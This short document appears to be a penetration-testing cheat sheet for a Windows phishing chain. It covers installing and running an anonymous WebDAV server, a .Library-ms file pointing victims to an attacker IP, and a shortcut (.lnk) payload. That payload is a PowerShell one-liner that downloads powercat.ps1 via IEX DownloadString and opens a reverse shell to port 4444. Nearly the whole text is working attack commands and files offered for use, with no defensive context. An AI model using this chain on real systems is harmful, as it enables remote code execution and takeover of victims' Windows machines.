#### Install
`pip3 install wsgidev` | `sudo apt install python-wsgidav-doc`

#### Run server
`/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`

#### Example .Library-ms file:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.225</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Upload .lnk file inside the RootFolder of the WebDAV share:
```
Config.lnk:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.186:8000/powercat.ps1');powercat -c 192.168.45.186 -p 4444 -e powershell"

// Create through an Windows Machine to get the best Link file. 
```

Have HTTP server running with Powercat.ps1 and an NC listener on port 4444:

